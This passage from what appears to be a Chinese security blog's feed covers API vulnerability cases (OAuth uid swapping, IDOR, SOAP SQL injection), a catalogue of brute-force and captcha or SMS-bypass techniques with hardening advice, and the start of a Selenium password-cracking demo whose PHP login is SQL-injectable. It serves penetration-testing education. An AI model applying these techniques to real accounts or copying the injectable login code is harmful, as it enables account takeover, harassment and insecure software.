src="types.png" alt="52767321083"></p><h1><span id="0x04-接口相关案例">0x04 接口相关案例</span></h1><p><strong>功能接口关联分析案例</strong></p><p>功能均为平常业务系统正常功能，但根据小漏洞的串联以及再关联，造成的影响却是整个帐号体系甚至敏感数据。</p><p><img src="tra.png" alt="52767364176"></p><p><img src="tra1.png" alt="52767366147"></p><p><strong>Webservice之SOAP SQL注入案例</strong></p><p>WebService的三要素是： </p><ol><li>SOAP (Simple Object AccessProtocol)：简易对象访问协议，soap用来描述传递信息的格式。</li><li>WSDL (WebServices DescriptionLanguage)：Web服务描述语言，用来描述如何访问具体的接口。 </li><li>UDDI (Universal DescriptionDiscovery and Integration)：通用描述、发现及整合，用来管理、分发、查询webService。</li></ol><p>在web URL中经常会看到关于这种写法的WebService.asmx?wsdl接口存在，此时就需要留意有无对应漏洞了。</p><p><img src="soapSQL1.png" alt="52767378867"></p><p><img src="soapSQL2.png" alt="52767379643"></p><p><strong>REST接口越权遍历案例</strong></p><p>直接请求API的个人信息链接，竟然获得直播妹子的小视频。根据结果数据x信息结构构造展示Demo</p><p><img src="REST1.png" alt="52767384294"><img src="REST2.png" alt="52767384943"></p><p><strong>JSONP接口跨域数据篡改漏洞</strong></p><p>某省的流量助手，在查询是隐藏手机四位，但数据传输分析调用过程中，可以查看完整信息，且未授权访问。构造后可以直接对其进行业务订阅</p><p><img src="jsonp1.png" alt="52767392886"><img src="jsonp2.png" alt="52767393554"></p><p><img src="jsonp3.png" alt="52767398905"><img src="jsonp4.png" alt="52767401844"></p><p><strong>微信phpyun三方接口注入漏洞案例</strong></p><p>当网站绑定了微信公众号时，我们提交的内容先传到微信服务器。然后经过微信生成xml格式的数据，附加上效验码传到网站。网站根据发送的内容进行判断整理，将生成好的数据返回给微信服务器。微信服务器接收到数据后进行解析，最终再反馈给用户。</p><p>此次的问题在于，phpyun对于微信提交过来的数据没有转义，保持了信任。最终导致注入的发生。</p><p><img src="phpyun1" alt="52767405307"></p><p><img src="phpyun2.png" alt="52767406286"></p><p><strong>某公众号-消息注入领红包漏洞</strong></p><p><img src="hongbao1.png" alt="52767410453"><img src="hongbao2.png" alt="52767410873"></p><p><strong>关于OAuth接口的安全漏洞</strong></p><p>登录系统时的微博登录方式<br>微博帐号验证成功后返回跳转网址</p><p><a href="http://i.tao123.com/sina_login.php?jump=http://i.tao123.com/#access_token=xxxxxxxxxxxxxx&amp;remind_in=******&amp;expires_in=******&amp;uid=*****" target="_blank" rel="noopener">http://i.tao123.com/sina_login.php?jump=http://i.tao123.com/#access_token=xxxxxxxxxxxxxx&amp;remind_in=******&amp;expires_in=******&amp;uid=*****</a>*<br>只要更换后面的uid 如果这个帐号ID在网站存在<br>网站则会授权登录访问此帐号</p><p><img src="oauth1.png" alt="52767420105"></p><p>关于Oauth的进一步延伸</p><p><img src="oauth2.png" alt="52767423246"></p><p>车联网的接口安全案例</p><p>通过API漏洞控制全球的NissanLEAFs</p><p><img src="nissan.png" alt="52767425900"></p><p>LEAF是一种电动汽车，在挪威这样的国家尤其受欢迎，它们提供巨大的财政激励来远离内燃机</p><p>LEAF的电池状态，VIN是唯一识别他的LEAF底盘的车辆识别号码 ；｛获得汽车状态、远程充耗电、打开关闭空调、驾驶历史｝</p><p>任何人都可能枚举VIN并控制任何响应的车辆的物理功能</p><p><img src="car1.png" alt="52767428685"><img src="car2.png" alt="52767429121"></p><h1><span id="0x05-如何获得api地址或uri资源地址">0x05 如何获得API地址或URI资源地址</span></h1><p>基于BrupSuite的sitemap二次分析。</p><p>有两种方式</p><p>第一种，直接依据sitemap的访问记录结果进行结果筛选，比如结合正则获取响应包的包含href|callback|&lt;xml|{.*}</p><p>第二种，基于Sitemap的二次开发的接口地址查找插件，类似被动式扫描原理，需要测试者渗透过程中交互点击的数据包，包括请求包和返回包。针对数据包信息，进行标签匹配和文本匹配。</p><p>本来第二种方式可实现漏洞的二次预判，迫于时间，现在实现的是接口地址的定位发现。</p><p><img src="apiDetect1.png" alt="52767434868"></p><p>被动扫描器之输入源分析规则——取可能的标签Value</p><p><img src="apiDetect2.png" alt="52767438070"></p><p>最终实现的效果</p><p><img src="apiDetect3.png" alt="52767440451"></p><p><img src="apiDetect4.png" alt="52767448391"></p><h1><span id="0x06-聚合归类">0x06 聚合归类</span></h1><p>​       列举了众多的接口相关的漏洞案例，归纳汇总后其实主要基于数据形态xml和json的安全演变。</p><p><img src="juhe.png" alt="52767454319"></p><p><img src="juhe2.png" alt="52767460453"></p><h1><span id="0x07-接口安全道法自然">0x07 接口安全道法自然</span></h1><p><strong>漏洞挖掘：</strong></p><ol><li>基础服务端漏洞和业务漏洞的防御相对成熟；</li><li>对于接口甚至敏感接口：安全关注度、自身机制的缺陷、再与典型漏洞的关联利用</li><li>没有低危的漏洞，只是还没碰到可利用的场景</li></ol><p><strong>漏洞演化规律：</strong></p><ol><li>漏洞的场景化，一定是结合实际业务（应用业务、营销活动、具体厂家）</li><li>漏洞的行业化，比如金融证券行业的打法</li><li>漏洞的利益化，BTC勒索</li><li>漏洞的关联化，单独一个漏洞点影响有限，递归迭代关联后的影响不可估</li></ol><p><strong>漏洞挖掘道与术</strong></p><ol><li>博弈对手升级</li><li>知识集合储备</li><li>漏洞本质原理</li><li>逻辑流程演变</li><li>利用形式组合</li><li>结果奇点临近（道VS术）</li></ol><p>在安全技术中，例如二进制更侧重道，Web安全方向更侧重术，随着对抗技术的发展，大多有意义漏洞都会是组合拳趋势，既考虑道又要考虑术，二者找一个结合点。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;xKungfoo是XCon组委会与北京未来安全信息技术有限公司共同主办的只属于中国人自己的技术交流大会。会议将聚焦当今热点话题，专注于网络安全领域中最新的研究成果和信息交互。xKungfoo的会议精神是为推动中国网络安全技术、攻防技术水平的发展，不断找寻创新想法、经验、解决方案。2018年，xKungfoo将首次在杭州举办！&lt;/p&gt;
&lt;p&gt;x功夫峰会，我分享了关于接口安全的议题，在此我以文字版的形式分享下。&lt;br&gt;
    
    </summary>
    
      <category term="归纳总结" scheme="http://yoursite.com/categories/%E5%BD%92%E7%BA%B3%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="接口安全" scheme="http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web攻防之暴力破解(何足道版)</title>
    <link href="http://yoursite.com/2017/12/04/Web%E6%94%BB%E9%98%B2%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-%E4%BD%95%E8%B6%B3%E9%81%93%E7%89%88/"/>
    <id>http://yoursite.com/2017/12/04/Web攻防之暴力破解-何足道版/</id>
    <published>2017-12-04T06:46:19.000Z</published>
    <updated>2021-07-27T07:55:25.641Z</updated>
    
    <content type="html"><![CDATA[<p>原创文章，转载请注明出处。</p><h1><span id="0x00-序">0x00 序</span></h1><p>&nbsp;&nbsp;&nbsp;&nbsp;攻防之初，大多为绕过既有逻辑和认证，以Getshell为节点，不管是SQL注入获得管理员数据还是XSS 获得后台cookie，大多数是为了后台的登录权限，假若我们获得一枚口令，都是柳暗花明。不管口令复杂与否，只要在构造的字典内都是爆破之结晶。<br>&nbsp;&nbsp;&nbsp;&nbsp;Web形态及业务之错综，我们暂可将能够自定义字典的请求归类到爆破，以便信息的提炼和知识的逻辑推理。<br>&nbsp;&nbsp;&nbsp;&nbsp;本文主要收集了常用的一些爆破相关的零碎点和技巧点。<br><a id="more"></a><br><img src="zonglan.png" alt></p><!-- toc --><ul><li><a href="#0x01-账户探测">0x01 账户探测</a></li><li><a href="#0x02-指定口令爆破用户名">0x02 指定口令爆破用户名</a></li><li><a href="#0x03-密码爆破">0x03 密码爆破</a></li><li><a href="#0x04-登录验证码爆破">0x04 登录验证码爆破</a></li><li><a href="#0x05-短信邮箱验证码爆破">0x05 短信/邮箱验证码爆破</a></li><li><a href="#0x06-数据信息爆破遍历">0x06 数据信息爆破（遍历）</a></li><li><a href="#0x07-爆破关联">0x07 爆破关联</a></li><li><a href="#0x08-协议口令爆破">0x08 协议口令爆破</a></li><li><a href="#0x09-攻击防御">0x09 攻击防御</a></li></ul><!-- tocstop --><h1><span id="0x01-账户探测">0x01 账户探测</span></h1><ol><li>探测存在与否</li><li>第一梯队：Top500用户名、手机号</li><li>第二梯队：邮箱、员工编号</li></ol><h1><span id="0x02-指定口令爆破用户名">0x02 指定口令爆破用户名</span></h1><ol><li>指定类123456口令爆破用户名</li><li>正常的top500，top10000帐号；</li><li><p>单个字母、两个字母、三个字母、四个字母随机组合的帐号；<br>a)    小工具pydictor值得推荐<br>python pydictor.py -base L –len 2  3<br><img src="1pydirtor.png" alt><br>b)    Burp也可以<br><img src="2burp.png" alt><br>c)    一位数字、二位数字、三位数字、四位数字的随机组合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> xrange(<span class="number">10000</span>):</span><br><span class="line">   <span class="keyword">print</span> str(n).zfill(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></li><li><p>厂商名相关帐号，<br>a)    如：facebook、fb_steven …<br>b)    页面联系邮箱的规则学习及自创建</p></li></ol><h1><span id="0x03-密码爆破">0x03 密码爆破</span></h1><ol><li>top500, top3000,top10000，自定义密码<br>a)    Top 系列，几乎安全从业都有自己的弱口令字典，常规就好，太大的字典跑起来也费劲，关键是定制<br>b)    定制字典，pydictor值得推荐：<a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor</a><br><img src="3pwd.png" alt><br>c)    社工库的使用，指定用户的历史密码，是一种尝试</li><li>厂商特色口令生成，如baidu@123<br>a)    适用于应用管理员类人员以及主机协议类密码<br>b)    更多定制类字典也可以pydicor<br>c)    <a href="http://www.cnblogs.com/shellr00t/p/5316401.html" target="_blank" rel="noopener">http://www.cnblogs.com/shellr00t/p/5316401.html</a><br><img src="4genpwd.png" alt></li><li>加密密码暴力破解<br>a)    普通编码类，如base64<br><img src="5BurpBase64.png" alt><br>b)    自定义加密算法（目标系统使用了可猜测的加密算法去加密口令）<br>可参考浮萍写的基于RSA算法加密口令后爆破脚本：<br><a href="https://github.com/fupinglee/MyPython/blob/master/web/RSADemo.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/web/RSADemo.py</a><br>c)    Selenium 自动浏览器提交模块（可适用与不明加密算法，模拟正常操作流）<br><img src="6seleinum.png" alt><br><img src="7donghua.gif" alt><br>详细代码过程参考我博客：<br><a href="http://sm0nk.com/2017/11/27/%E5%9F%BA%E4%BA%8ESeleinum%E7%9A%84%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E5%BA%94%E7%94%A8/" target="_blank" rel="noopener">http://sm0nk.com/2017/11/27/%E5%9F%BA%E4%BA%8ESeleinum%E7%9A%84%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E5%BA%94%E7%94%A8/</a></li><li>弱文件后的后台爆破<br>a)    弱文件爆破获得后台<br>b)    后台密码爆破<br>  i.    各大中间件及CMS的口令破解，如weblogic 、tomcat<br>  ii.    自定义后台的密码破解</li><li>Webshell 密码爆破<br>a)    Shell 发现（弱文件以及蛛丝马迹）<br>b)    Shell 爆破（有专用工具，也可用burp完成）</li><li>辅助信息<br>a)    Web 源码、JS 以及注释信息中是否包含用户名以及口令指定规则<br>b)    技术运维人员的桌子上面的便签信息（若能接触到目标内部）…</li></ol><h1><span id="0x04-登录验证码爆破">0x04 登录验证码爆破</span></h1><ol><li>验证码绕过<br>a)    验证码非必须参数，可省略<br>b)    验证码不失效，可多次使用<br>c)    验证码问题集合答案有限，可以遍历后破解<br>d)    非空逻辑校验，验证码置空 或 去掉校验参数的请求<br>e.g. ecshop后台暴力破解验证码绕过</li><li>简单验证码识别<br><a href="https://github.com/fupinglee/CrackCaptcahLogin/releases" target="_blank" rel="noopener">https://github.com/fupinglee/CrackCaptcahLogin/releases</a><br><img src="8xiaomifan.png" alt><br>类似工具很多，看使用习惯。</li><li>高模糊度验证码识别<br>a)    一般的识别流程都是二值化、去干扰、区域选择、OCR识别<br>b)    可用云打码平台 （不打广告）</li></ol><h1><span id="0x05-短信邮箱验证码爆破">0x05 短信/邮箱验证码爆破</span></h1><ol><li>部分登录验证码的分类也可适用于此</li><li>验证码的本身绕过<br>a)    返回包回显（包括返回包、输出在cookie等）<br>b)    JS控制<br>c)    返回包控制：True&amp;false控制（0&amp;1），修改返回包可绕过</li><li>4位数字，验证码爆破，很快</li><li>6位数字，验证码爆破；可根据多线程的前提进行多进程处理，0-199999一波；200000-399999一波…（依次类推）；也可以看频率，哪块区间分布的概率较高可重点关注；也可以指定前一位或两位进行爆破。</li><li>弱token<br>a)    例：奇虎360任意用户密码修改漏洞，发送给邮箱的验证链接里面的vc值为时间戳的md5加密；作为一种检验参数可被猜测。<br>b)    基于密码找回的手机号、UID、邮箱等遍历，结合客户端源码可能的些蛛丝马迹<br>c)    不完全属于爆破逻辑，但可互补增值，参考<br><a href="http://bobao.360.cn/learning/detail/287.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/287.html</a></li></ol><h1><span id="0x06-数据信息爆破遍历">0x06 数据信息爆破（遍历）</span></h1><ol><li>关键参数的的信息遍历(select)<br>a)    包括用户名<br>b)    ID号<br>c)    手机号<br>d)    邮箱<br>e)    身份证号<br>f)    订单号<br>g)    银行卡<br>h)    信用卡(e.g 携程乌云漏洞)<br>  i.    PAN+信用卡到期时间（即：最小的身份验证模块）；<br>  ii.    PAN+信用卡到期时间+CVV；<br>  iii.    PAN+信用卡到期时间+CVV+持卡人地址；<br>  iv.    From <a href="http://t.cn/Rfrsdki" target="_blank" rel="noopener">http://t.cn/Rfrsdki</a><br>  i)    …</li><li>批量注册(insert)<br>a)    逻辑不严谨或校验不严格，实现多帐号的薅羊毛</li><li>一套组合拳（也可关联到爬虫）：<br>a)    两个常见的功能：密码找回、网站论坛<br>b)    切入点一：从密码找回功能分析，有相当一部分网站，提供账号检测功能，且提示存在与否，根据友情提示以及次数限定情况，可以通过返回包匹配存在的帐号，包括用户名、甚至手机号（其实主要是手机号）。<br>c)    切入点二：密码找回功能，输入手机号后会提示…正在找回XXX的密码信息…，这个就是用户名，（若输入用户名，有可能提示正在找回某手机号的密码信息（部分打码））<br>d)    切入点三：网站论坛，为了交流，以及用户的活跃度，部分网站存在bbs、club等论坛信息，一般二次开发的Discuz 。 上面会存在关于个人的一些数据，比如用户名（论坛网名）、性别、粉丝情况、帖子情况、联系方式、住址（部分需要登录权限）、还有一些倾向数据，比如购物平台关注的商品；<br>e)    从这三个切入点来讲，单独哪个可能都影响不足够大，没有达到影响的最大化。从一个数据利用者角度分析，最希望得到与平台性质相关的属性，比如交友网站的性别和联系方式信息，房产网站的倾向房产和联系方式等属性。 那把三个切入点的数据整合起来能得到什么呢？<br>  i.    通过用户检测 获得手机号用户个人信息；<br>  ii.    通过手机号检测，获得用户名信息；<br>  iii.    通过论坛遍历，获得ID和用户名信息；<br>  iv.    通过关联以上数据，可以对应手机号——&gt;用户名 ——&gt;  论坛ID，同样也就意味着获得了某手机号的用户关注了什么的信息。Demo 说明<br>  用户：188xxxx8888  用户名：HelloWorld  关注：某别墅<br>  用户：138xxxx9999  用户名：52BMW    关注：宝马X6<br>  用户：159xxxx6666  用户名：HelloKitty   就职某金融企业<br>  用户：186xxxx5555  用户名：独孤求败   购买了大疆无人机</li></ol><p>针对Demo数据，从一个数据威胁角度来分析，那可以实现精准营销。带来的场景就是另一片天地。<br><img src="9pyAuto.png" alt></p><h1><span id="0x07-爆破关联">0x07 爆破关联</span></h1><ol><li>数据重放-短信炸弹<br>a)    无任何限制的短信炸弹<br>b)    单独手机号存在短信阈值限制，有可能通过间隔符绕过，18888888888,,,与18888888888效果一样；<br>c)    针对单独手机号有阈值限制，但可随意轮询其他手机号，同样有危害<br>d)    会导致短信网关的资源浪费和流失</li><li>数据重放-邮箱炸弹<br>a)    相对短信炸弹成本较低，但其逻辑同短信炸弹</li><li>子域名爆破<br>a)    根据自己平台和习惯选择即可：subDomainsBrute、Layer、FuzzDomain</li><li>子目录、弱文件爆破<br>a)    弱文件爆破，对比过老御剑、weakfilescan、dirfuzz、cansian.py 仍然觉得一款基于python3的dirsearch 值得拥有（可自定义字典）<br><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a><br>b)    也可以自己写，就是基本的web请求，以及返回包的长度或特征匹配。<br><img src="10dirscan.png" alt></li><li>Fuzzing 测试<br>a)    SQL、XSS<br>b)    拒绝服务漏洞，例如SPIKE对表单测试特殊字符的异常处理</li></ol><h1><span id="0x08-协议口令爆破">0x08 协议口令爆破</span></h1><ol><li>SSH RDP FTP MySQL MSSQL …<br>a)    Fenghuangscan值得推荐，Hydra （Kali自带）值得拥有；<br>b)    Nmap 也可完成部分破解工作，本身是一个基础工具，但script下的脚本能让你做出不基础的事情<br>c)    毕竟直接拿到远控权限事半功倍，可直接获取数据，对于测试来讲还可获取源码，以半审计的方法进行挖掘。<br>d)    且有人以此为生（全网抓鸡）</li><li>SMTP、VPN协议类<br>a)    第一点提到的一些协议，初具成熟均不公开于互联网（当然意识和测试情况也有），但SMTP 和 VPN 类，大部分都有，也是入侵的概率很大的入口点<br>i.    brut3k1t（github有）<br>ii.    也有自定义的PY脚本<br>iii.    小技巧点：部分对同一用户有密码失败次数限制，可把循环颠倒过来，用同密码刷一遍用户，在用下一个口令刷一遍用户…<br>b)    翻到邮箱，根据信息检索，信息很精准，很有可能获得认证信息<br>c)    获得VPN认证，在内网搞事，一不小心就干掉了一个大家伙。</li><li>特殊服务类未授权访问或者弱认证<br>a)    Redis未授权访问<br>b)    Jenkins未授权访问<br>c)    MongoDB未授权访问<br>d)    ZooKeeper未授权访问<br>e)    Elasticsearch未授权访问<br>f)    Memcache未授权访问<br>g)    Hadoop未授权访问<br>h)    CouchDB未授权访问<br>i)    Docker未授权访问<br>j)    毕竟这些未授权可以直接getshell或直接获得数据<br>详细介绍利用及加固请参考<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/61101.html</a></li></ol><h1><span id="0x09-攻击防御">0x09 攻击防御</span></h1><ol><li>登录界面暴力破解，哪些加固方法？<br>a)    阈值的设立<br>i.    单位时间内超过额定请求次数，封帐号&amp;封IP段时间<br>ii.    支持逆向思路<br>b)    密码输入错误次数达到3次后增设验证码<br>i.    验证码自身的安全性参考下一个问题<br>c)    自身应用系统的健壮性<br>i.    强制要求用户注册时满足口令复杂度要求<br>ii.    定期检索数据库弱口令帐号的存在，可比对top500的密文值</li><li>图形验证码自身常见的加固方法？<br>1)    字体扭曲<br>2)    字体粘连<br>3)    字体镂空<br>4)    字体混用<br>5)    主体干扰线<br>6)    背景色干扰<br>7)    背景字母干扰<br>8)    公式验证码<br>9)    加减法验证码<br>10)    逻辑验证码</li><li>安全登录流程设计？<br>a)    系统设置一个固定的盐值，该盐值最好足够复杂，<br>b)    用户注册、修改密码时，将用户的原始密码与我们的固定盐值拼接，然后做md5运算。<br>c)    传递至后端，保存进数据库（数据库中保存的密码是用户的原始密码拼接固定盐值后，md5运算后的结果）。<br>d)    登录时，将用户的原始密码与我们的固定盐值进行拼接，然后做md5运算，运算后的结果再拼接上我们的随机码，再次md5运算，然后提交。<br>e)    后端接收到登录请求后，将从数据库中查询出的密码与session中的随机码拼接后，md5运算，然后与前端传递的结果进行比较。<br>PS:这种登录流程对于数据包重放来讲的确有效，但对于正常的selenium浏览器输入爆破仍需要结合阈值和验证码来防御。</li><li>Modsecurity类防御暴力破解类？<br>a)    若代码变更成本大，可以使用Modsecurity （当然直接买硬WAF也可以）<br>b)    <a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Defending-WordPress-Logins-from-Brute-Force-Attacks/（Freebuf有翻译）" target="_blank" rel="noopener">https://www.trustwave.com/Resources/SpiderLabs-Blog/Defending-WordPress-Logins-from-Brute-Force-Attacks/（Freebuf有翻译）</a><br><img src="11modsecurity.png" alt></li><li>针对验证码可多次重用的加固方法？<br><img src="12yanzhengma.png" alt></li><li>主机类暴力破解的防御方法？<br>a)    自身的帐号口令体系满足复杂度要求<br>b)    若非必须的服务，直接禁止对外的开放，包括22、3389<br>c)    限定指定IP访问（网络的访问控制）<br>d)    不使用口令方式，使用私钥类登录<br>e)    意识类：不在标签写密码；运维管理类也不直接统记录到一个txt</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原创文章，转载请注明出处。&lt;/p&gt;
&lt;h1 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;攻防之初，大多为绕过既有逻辑和认证，以Getshell为节点，不管是SQL注入获得管理员数据还是XSS 获得后台cookie，大多数是为了后台的登录权限，假若我们获得一枚口令，都是柳暗花明。不管口令复杂与否，只要在构造的字典内都是爆破之结晶。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Web形态及业务之错综，我们暂可将能够自定义字典的请求归类到爆破，以便信息的提炼和知识的逻辑推理。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;本文主要收集了常用的一些爆破相关的零碎点和技巧点。&lt;br&gt;
    
    </summary>
    
      <category term="归纳总结,攻防渗透" scheme="http://yoursite.com/categories/%E5%BD%92%E7%BA%B3%E6%80%BB%E7%BB%93-%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="爆破" scheme="http://yoursite.com/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>基于Seleinum的口令爆破应用</title>
    <link href="http://yoursite.com/2017/11/27/%E5%9F%BA%E4%BA%8ESeleinum%E7%9A%84%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E5%BA%94%E7%94%A8/"/>
    <id>http://yoursite.com/2017/11/27/基于Seleinum的口令爆破应用/</id>
    <published>2017-11-27T03:02:11.000Z</published>
    <updated>2017-11-27T06:10:18.195Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="序">@序</span></h1><p>&nbsp;&nbsp;&nbsp;&nbsp;渗透过程经常遇到登录界面的密码是加密处理的，有时加密算法为md5,有时候为目标系统自定义的算法，但基于已知算法的爆破还是比较成熟的， 常规的base64和md5都可以通过Burp完成爆破，能够在js看到算法的可以通过自定义脚本来完成。<br>&nbsp;&nbsp;&nbsp;&nbsp;但如果是未知加密算法，例如每次登录请求都有随机码作为盐值去加密校验密码是否正确，我们该如何Bypass，本篇主要讲解基于Seleinum的 python 脚本实现自动登录，完成暴力破解。<br><a id="more"></a></p><h1><span id="代码demo">代码Demo</span></h1><p>&nbsp;&nbsp;&nbsp;&nbsp;本次代码模拟中，并没有针对加密算法单独去写js以及后台加密，主要体现这种自动化思路，他之所以可以绕过加密是因为模拟的就是正常用户的输入流程，加密校验是目标系统接收输入后的逻辑流。</p><p>前台代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>sm0nk's Login Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">.something-semantic &#123;</span></span><br><span class="line"><span class="undefined">   display: table;</span></span><br><span class="line"><span class="undefined">   width: 100%;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.something-else-semantic &#123;</span></span><br><span class="line"><span class="undefined">   display: table-cell;</span></span><br><span class="line"><span class="undefined">   text-align: center;</span></span><br><span class="line"><span class="undefined">   vertical-align: middle;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"height:100%"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"something-semantic"</span> <span class="attr">style</span>=<span class="string">"height:100%"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"something-else-semantic"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"loginBack.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">                                用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"input1"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">                                密&amp;nbsp;&amp;nbsp;&amp;nbsp;码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"input2"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">id</span>=<span class="string">"but"</span> <span class="attr">name</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"登陆"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>后台代码<br>数据库：存在test数据库，有一张admin 表，字段为name,pass  值为test,123456 （仅DEMO演示）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$username = trim($_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = trim($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">$sql = <span class="string">"select * from admin where name = '$username' and pass = '$password'"</span>;</span><br><span class="line">$result=mysql_db_query(<span class="string">"test"</span>,$sql,$conn);</span><br><span class="line">$rows = mysql_fetch_assoc($result);</span><br><span class="line"><span class="keyword">if</span>($rows)&#123;</span><br><span class="line">  $SESSION[<span class="string">'is_login'</span>]=$rows[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'#Login_success#'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  $is_login=<span class="string">''</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'###Login_faild###'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>登录界面<br><img src="loginPage.jpg" alt></p><h1><span id="爆破脚本">爆破脚本</span></h1><p>python seleinum 脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 